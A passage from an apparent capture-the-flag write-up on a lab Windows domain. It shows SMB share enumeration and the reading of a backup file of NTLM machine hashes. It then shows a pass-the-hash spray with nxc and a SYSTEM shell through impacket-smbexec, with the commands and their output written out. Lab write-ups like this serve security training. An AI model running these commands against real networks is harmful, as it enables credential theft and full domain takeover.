SMB         10.201.102.90   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.102.90   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.102.90   445    DC01             Users
```

Nice, we can read it, time to go into smb:

```
smbclient //10.201.102.90/backup -U 'file_svc'
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024
```

Got a file:

```
cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

These hashes could be suitable for a `pass-the-hash` attack since they're `NTLM` hashes, let's get the users and the hashes using cut:

```bash
cut -d':' -f1 backup_extract.txt > users.txt

cut -d':' -f4 backup_extract.txt > nthashes.txt
```

Let's test the pass the hash using `nxc`:

```
nxc smb SOUPEDECODE.LOCAL -u users.txt -H nthashes.txt --no-brute
SMB         10.201.102.90   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.201.102.90   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.201.102.90   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.201.102.90   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.201.102.90   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (../../IMAGES/Pwn3d!)
```

`FileServer$` is vulnerable to pass the hash, we were able to get access, `winrm` isn't enabled on the machine so we need to use `impacket-smbexec` to get a shell:

```bash
impacket-smbexec 'SOUPEDECODE.LOCAL/FileServer$@10.201.102.90' -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
```

Once we go to the shell, we notice we're `nt authority\system`:

![Pasted image 20250808174915.png](../../IMAGES/Pasted%20image%2020250808174915.png)

Let's read both flags and end the CTF:

```
C:\Windows\system32>type C:\Users\ybob317\Desktop\user.txt
28189316c25dd3c0ad56d44d000d62a8

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

![Pasted image 20250808174920.png](../../IMAGES/Pasted%20image%2020250808174920.png)

